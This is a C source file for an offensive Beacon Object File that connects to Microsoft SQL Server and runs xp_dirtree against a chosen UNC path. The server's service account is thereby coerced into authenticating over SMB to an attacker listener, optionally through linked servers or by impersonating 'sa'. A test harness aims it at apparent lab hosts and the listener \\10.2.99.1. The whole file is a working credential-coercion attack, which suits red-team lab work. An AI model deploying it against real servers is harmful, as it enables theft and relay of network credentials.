#include "bofdefs.h"
#include "base.c"
#include "sql.c"


void CoerceSmb(char* server, char* database, char* link, char* impersonate, char* listener)
{
    SQLHENV env		= NULL;
    SQLHSTMT stmt 	= NULL;
	SQLHDBC dbc 	= NULL;
	char * query	= NULL;
	SQLRETURN ret;
	size_t totalSize;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret))
	{
		internal_printf("[!] Error allocating statement handle\n");
		goto END;
	}

	char* linkPrefix = "SELECT 1; ";
	char* prefix = "EXEC master..xp_dirtree '";
	char* suffix = "';";

	if (link == NULL)
	{
		internal_printf("[*] Triggering SMB request to %s on %s\n\n", listener, server);
		totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));
		MSVCRT$strcpy(query, prefix);
	}
	else
	{
		internal_printf("[*] Triggering SMB request to %s on %s via %s\n\n", listener, link, server);
		totalSize = MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));
		MSVCRT$strcpy(query, linkPrefix);
		MSVCRT$strncat(query, prefix, totalSize - MSVCRT$strlen(linkPrefix) - 1);
	}
	
	MSVCRT$strncat(query, listener, totalSize - MSVCRT$strlen(linkPrefix) - 1);
	MSVCRT$strncat(query, suffix, 	totalSize - MSVCRT$strlen(linkPrefix) - 1);

	//
	// Run the query
	//
	if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
		goto END;
	}

	internal_printf("[*] SMB request triggered\n");

END:
	if (query != NULL) intFree(query);
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* listener;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	listener 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;
	
	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	CoerceSmb(server, database, link, impersonate, listener);

	printoutput(TRUE);
};

#else

int main()
{
	internal_printf("============ BASE TEST ============\n\n");
	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "\\\\10.2.99.1");

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "\\\\10.2.99.1");

	internal_printf("\n\n============ LINK TEST ============\n\n");
	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "\\\\10.2.99.1");
}

#endif
